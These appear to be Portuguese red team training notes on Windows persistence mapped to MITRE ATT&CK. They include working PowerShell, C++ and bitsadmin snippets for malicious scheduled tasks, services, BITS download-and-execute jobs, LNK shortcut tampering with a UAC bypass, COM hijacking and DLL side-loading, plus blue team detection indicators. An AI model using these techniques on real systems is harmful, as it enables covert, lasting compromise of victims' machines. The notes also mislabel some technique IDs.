- ATT&CK for Enterprise (matrix completa): https://attack.mitre.org/matrices/enterprise/
- Varonis Kill Chain (8 fases): https://www.varonis.com/blog/cyber-kill-chain

---

## Técnicas MalTrak - Módulo 06

### MITRE ATT&CK Matrix na Prática (Simulação APT)

O Módulo 06 do MalTrak foca em usar o MITRE ATT&CK como guia operacional para simular comportamentos de APT real. A seguir, as técnicas e táticas mais relevantes extraídas das aulas práticas.

---

### Visão Geral da Matrix ATT&CK (Enterprise)

A matrix completa cobre 14 táticas, cada uma com múltiplas técnicas:

| Tática | Qtd Técnicas | Técnicas Relevantes para Red Team |
|--------|-------------|-----------------------------------|
| Reconnaissance | 10 | Active Scanning, Gather Victim Info, Phishing for Info |
| Resource Development | 6 | Acquire Infrastructure, Compromise Accounts, Develop Capabilities |
| Initial Access | 9 | Phishing, Drive-by Compromise, Valid Accounts, Supply Chain |
| Execution | 10 | Command/Scripting Interpreter, Native API, Scheduled Task/Job |
| Persistence | 18 | Registry Run Keys, Scheduled Tasks, Services, BITS Jobs |
| Privilege Escalation | 12 | Abuse Elevation Control Mechanism, Access Token Manipulation |
| Defense Evasion | 37 | Masquerading, Obfuscated Files, Indirect Command Execution |
| Credential Access | 14 | Brute Force, Credentials from Password Stores, OS Credential Dumping |
| Discovery | 25 | Account Discovery, Network Service Scanning, Process Discovery |
| Lateral Movement | 9 | Remote Service, Lateral Tool Transfer, Internal Spearphishing |
| Collection | 17 | Audio Capture, Clipboard Data, Screen Capture, Data Staged |
| Command and Control | 16 | Application Layer Protocol, Proxy, Non-Standard Port, Ingress Tool |
| Exfiltration | 9 | Automated Exfiltration, Exfiltration Over C2, Data Transfer Size Limits |
| Impact | 13 | Data Destruction, Data Encrypted for Impact, Defacement, Service Stop |

---

### Manutenção de Persistência - Técnicas Detalhadas

#### T1547.001 - Registry Run Keys / Startup Folder

**Run e RunOnce Keys** são os locais mais famosos para persistência de malware.

**Chaves sem privilégio de admin (HKCU):**
```
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
```

**Chaves que requerem admin (HKLM):**
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
```

**OPSEC:** Com registro, sem privilégios de admin só é possível escrever em `HKEY_CURRENT_USER`. Técnicas que usam `HKLM` requerem escalada de privilégios primeiro.

**Ferramenta de detecção:** Autoruns.exe (Sysinternals) lista todos os pontos de autorun do sistema, incluindo Run keys, Image Hijacks, AppInit, KnownDLLs, Winlogon, Scheduled Tasks, Services e Drivers.

---

#### T1053.005 - Scheduled Task/Job

**Características:**
- Técnica muito comum e fácil de detectar
- Nao requer privilégios elevados (pode funcionar em Medium Integrity)
- Pode se camuflar com atividades administrativas legítimas
- Útil para servidores
- Disfarce: usar nome de processo Windows assinado

**Criação via PowerShell:**
```powershell
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-nop -c ..."
$Trigger = New-ScheduledTaskTrigger -AtLogOn -User "amrth"
$Settings = New-ScheduledTaskSettingsSet
$Principal = New-ScheduledTaskPrincipal "MyMalware"
$SchTask = New-ScheduledTask -Action $Action -Trigger $Trigger -Settings $Settings
Register-ScheduledTask MyMalware -InputObject $SchTask
```

**Criação via C++:** Usa COM Objects `ITaskScheduler`. Documentado no MSDN.

---

#### T1546.010 - AppInit_DLLs

**Chave de registro:**
```
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows
Valor: AppInit_DLLs
```

**Como funciona:**
- Toda biblioteca listada neste caminho é carregada em TODOS os processos do sistema
- Excelente para disfarce como processo legítimo
- Requer privilégios elevados (admin)

---

#### T1543.003 - Criar ou Modificar Serviço do Sistema

**Características:**
- Um dos locais clássicos para persistência
- Requer privilégios elevados (*)
- Elevar ao nível de conta SYSTEM
- Pro tip: útil para RDP Hijacking

**APIs necessárias em C++ para criar serviço:**
```cpp
// 1. OpenSCManager - inicializa o service manager (ALL Access necessário)
SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

// 2. CreateService - cria o serviço com nome, descrição, caminho e tipo
SC_HANDLE hService = CreateService(
    hSCM,                    // handle do SCM
    "MyMalwareSvc",          // nome do serviço
    "My Malware Service",    // nome de exibição
    SERVICE_ALL_ACCESS,      // acesso
    SERVICE_WIN32_OWN_PROCESS, // tipo
    SERVICE_AUTO_START,      // início automático
    SERVICE_ERROR_NORMAL,    // erro
    "C:\\malware.exe",       // caminho
    NULL, NULL, NULL, NULL, NULL
);

// 3. StartService - inicia o serviço criado
StartService(hService, 0, NULL);
```

**DLL como serviço:**
- Serviços DLL rodam dentro do processo `svchost.exe`
- `svchost.exe` é o processo de hospedagem de serviços do Windows
- Excelente disfarce como processo legítimo
- Bypassa whitelisting de aplicações

---

#### T1547.009 - Image File Execution Options (IFEO)

**Como funciona:**
- IFEO permite que desenvolvedores anexem debuggers a aplicações específicas
- Requer privilégios elevados

**Caminho:**
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<nome_do_app>
```

**Técnica de abuso:**
- Adicionar valor `Debugger` com o caminho do malware
- Quando a aplicação alvo for executada, o malware será chamado primeiro como "debugger"
- Exemplo: quando `notepad.exe` iniciar, seu malware inicia no lugar

---

#### T1197 - BITS Jobs (Background Intelligent Transfer Service)

**O que é BITS:**
- Serviço Windows para download/upload de arquivos em segundo plano
- Usado para Windows Update e outras transferências do sistema
- Processo whitelistado pelo firewall (contorna bloqueios de rede)
- Pode executar um comando ou iniciar processo ao completar download

**Usos ofensivos:**
- Download de payloads adicionais (contorna bloqueios de egress)
- Exfiltração de dados
- Persistência (combinando com Run keys ou Scheduled Tasks)
- Ataques fileless (download para memória)

**Via bitsadmin (linha de comando):**
```cmd
bitsadmin /create persistence
bitsadmin /addfile persistence http://127.0.0.1/invalid.exe c:\windows\i.exe
bitsadmin /SetNotifyCmdLine persistence c:\windows\malware.exe NULL
bitsadmin /resume persistence
```

**Via PowerShell:**
```powershell
# Download normal
Start-BitsTransfer -Source C:\clientsourcedir\*.txt -Destination c:\clientdir\ -TransferType Download

# Iniciar suspenso e retomar no login (persistência)
Start-BitsTransfer -Suspended
Resume-BitsTransfer -BitsJob $Bits
```

**Via C++:** Baseado em COM Objects, documentado pelo MSDN.

---

#### T1547.006 - Kernel Modules and Extensions (via AppInit)

Veja seção AppInit_DLLs acima - mesma categoria de persistência via bibliotecas carregadas automaticamente.

---

#### T1547.001 - Arquivos LNK (Shortcuts)

**Por que LNK é poderoso:**
- Excelente para engenharia social
- Usado tanto em acesso inicial quanto em persistência
- Pode ser configurado para rodar como administrador (bypass UAC gratuito!)
- Pode ser automatizado com PowerShell

**Criação e modificação de LNK via PowerShell:**
```powershell
$destination = "C:\Users\<username>\Desktop\Chrome.lnk"
$shortcut = $shell.CreateShortcut($destination)

# Ícone legítimo para disfarce
$shortcut.IconLocation = "C:\path\to\Chrome.exe,0"
$shortcut.IconLocation = $shortcut.TargetPath + $shortcut.IconLocation

# Prepend malware ao comando original
$originalcmd = $shortcut.TargetPath + " " + $shortcut.Arguments
$shortcut.TargetPath = "<malware>.exe;" + $originalcmd
$shortcut.Save()
```

**Configurar LNK para rodar como admin (1 bit no arquivo):**
```powershell
$bytes = [System.IO.File]::ReadAllBytes($destination)
$bytes[0x15] = $bytes[0x15] -bor 0x20   # set byte 21 (0x15) bit 6 (0x20) ON - bor é bitwise OR
[System.IO.File]::WriteAllBytes($destination, $bytes)
```

**Disfarce como aplicação legítima:**
- Usar **Resource Hacker** para copiar todos os recursos do `chrome.exe` (ícones, versao do arquivo, metadados) para o malware
- O usuário vê ícone e versao do Chrome, mas executa o malware

---

#### T1546.001 - Associação de Arquivo (File Association)

**Como funciona:**
- Alterar o aplicativo padrão para abrir tipos de arquivo específicos
- Requer privilégios elevados (*)
- Pode injetar código antes de abrir `.doc` com Word
- Útil para movimentação lateral

**Localização:**
```
HKEY_CLASSES_ROOT                      # armazena todas as associações
HKEY_CLASSES_ROOT\.docx\              # valor padrão = "Word.Document.12"
HKEY_CLASSES_ROOT\Word.Document.12\shell\Open  # comando de abertura
```

**Técnica:**
1. Ler o valor padrão de `HKEY_CLASSES_ROOT\.docx\` para obter o tipo
2. Navegar até `HKEY_CLASSES_ROOT\<tipo>\shell\Open`
3. Modificar o comando para executar malware ANTES do Word abrir o arquivo
4. Também possível adicionar subcomandos personalizados (Print, Edit, etc.)

---

#### T1546.015 - Component Object Model (COM) Hijacking

**O que são COM Objects:**
- Aplicações orientadas a objeto (semi-aplicações) que se comunicam com outras apps
- Podem ser executados dinamicamente por outras aplicações
- Task Scheduler, BITS Admin e outros usam COM
- Registro armazena todas as informações de cada COM Object

**Localização no registro:**
```
HKEY_CLASSES_ROOT                      # todos os COM Objects
HKEY_CLASSES_ROOT\<Nome>\CLSID        # GUID do COM Object
HKEY_CLASSES_ROOT\CLSID\{GUID}\InProcServer32  # DLL do COM Object
HKEY_CURRENT_USER\Software\Classes    # COM Objects do usuário (prioridade MAIOR!)
```

**Abuso para persistência:**
- `HKEY_CURRENT_USER` tem prioridade MAIOR que `HKEY_CLASSES_ROOT`
- Criar COM Object malicioso em `HKCU\Software\Classes` sobrescreve o legítimo
- Não precisa de privilégios de admin!

**Listar todos os COM Objects:**
```powershell
Get-ChildItem HKLM:\Software\Classes -ErrorAction SilentlyContinue | Where-Object {
    $_.PSChildName -match '^\w+\.\w+$' -and (Test-Path -Path "$($_.PSPath)\CLSID")
} | Select-Object -ExpandProperty PSChildName
```

**Ativar COM Object malicioso via LOLBins:**
```cmd
rundll32.exe -sta {CLSID}
verclsid.exe /S /C {CLSID}
xwizard.exe RunWizard /taero /u {CLSID}
```

---

#### DLL Side-Loading (T1574.002)

**Técnica:** Substituir uma DLL legítima que um processo confiável carrega.

**Como funciona:**
1. Identificar processo legítimo (assinado) que carrega uma DLL
2. Substituir a DLL por malware com o mesmo nome
3. O processo legítimo carrega o malware no lugar da DLL original
4. O malware carrega a DLL original para nao quebrar o processo pai

**Requisitos:**
- Acesso de escrita ao caminho onde a DLL é procurada
- O caminho deve ter prioridade maior que o caminho original
- Exportar as mesmas funções da DLL original (para não quebrar o processo pai)

**Exemplo real - PlugX APT:**
- PlugX usou `nv.exe` (aplicação legítima NVIDIA)
- Enviou junto a DLL maliciosa `nvSmartMax.dll`
- Quando `nv.exe` era executado, carregava automaticamente a DLL maliciosa
- Malware ganhava persistência via processo legítimo e assinado

**Cenário 1 (DLL lado por lado):**
Usar ferramenta como pe-studio para identificar quais DLLs um executável carrega:
- Analisar imports do `python.exe` → identifica `python39.dll` como dependência
- Criar DLL maliciosa com mesmo nome e exportar `Py_Main` (única função necessária)
- Colocar DLL maliciosa no diretório da aplicação (Application directory = prioridade maior)

---

#### T1546.013 - PowerShell Profile

**Como funciona:**
- PowerShell carrega um arquivo de perfil ao iniciar
- O perfil pode sobrescrever comandos PowerShell conhecidos
- Força execução do malware toda vez que PowerShell é aberto
- Disfarça execução maliciosa de PowerShell

**Variáveis de caminho:**
```powershell
$PROFILE                        # perfil do usuário atual
# C:\Users\amrth\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1

$PROFILE.AllUsersCurrentHost    # perfil de todos os usuários (requer admin)
# C:\Windows\System32\WindowsPowerShell\v1.0\Microsoft.PowerShell_profile.ps1
```

**Técnica usada por APT Turla:**
- Grupo Turla (atribuído à Rússia) usou PowerShell profiles para persistência
- Referência: https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/

---

### Mapeamento ATT&CK - Técnicas do Módulo 06

| Técnica | ID MITRE | Nível de Privilégio |
|---------|----------|---------------------|
| Registry Run Keys | T1547.001 | Medium (HKCU) / High (HKLM) |
| Scheduled Task | T1053.005 | Medium |
| AppInit_DLLs | T1546.010 | High (admin) |
| Windows Service | T1543.003 | High (admin) |
| Image File Execution Options | T1546.012 | High (admin) |
| BITS Jobs | T1197 | Medium |
| Shortcut Modification | T1547.009 | Medium |
| File Type Association | T1546.001 | High (admin) |
| COM Hijacking | T1546.015 | Medium (HKCU) |
| DLL Side-Loading | T1574.002 | Medium |
| PowerShell Profile | T1546.013 | Medium/High |

---

### Indicadores de Detecção Blue Team - Módulo 06

**Registry Run Keys:**
- Event ID 4657 (registro modificado) em `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- Autoruns.exe para auditoria manual
- Processo desconhecido adicionado às Run Keys

**Scheduled Tasks:**
- Event ID 4698 (nova task agendada criada)
- `schtasks /query /fo LIST /v` para listar todas
- Tasks com nomes suspeitos ou que executam processos incomuns

**Services:**
- Event ID 7045 (novo serviço instalado)
- Serviço apontando para caminho em `%TEMP%` ou `%APPDATA%`
- Serviço sem assinatura digital

**BITS Jobs:**
- `bitsadmin /list /verbose` lista jobs ativos
- Event ID 3 (Sysmon network connection) para transferências BITS incomuns

**COM Hijacking:**
- Monitorar criação de chaves em `HKCU\Software\Classes\CLSID`
- Processo carregando DLL de caminho de usuário (não System32)

**DLL Side-Loading:**
- Sysmon Event ID 7 (ImageLoad) - DLL carregada por processo inesperado
- DLL não assinada no diretório de aplicação legítima

---

### Autoruns.exe - Ferramenta Essencial

O Autoruns.exe (Sysinternals) é a ferramenta definitiva para enumerar pontos de autorun:

**Tabs mais importantes:**
- **Everything**: visão geral de todos os pontos de persistência
- **Logon**: Run/RunOnce keys e Startup folders
- **Scheduled Tasks**: todas as tasks agendadas
- **Services**: todos os serviços do Windows
- **Drivers**: drivers carregados no boot
- **Image Hijacks**: IFEO hijacking
- **AppInit**: DLLs no AppInit
- **KnownDLLs**: DLLs carregadas em todos os processos
- **Winlogon**: DLLs carregadas no login
- **Internet Explorer**: extensões e BHOs

**Para red teamers:** Use Autoruns no ambiente alvo (via agente C2) para enumerar persistências existentes que podem ser abusadas para LOLBin execution.
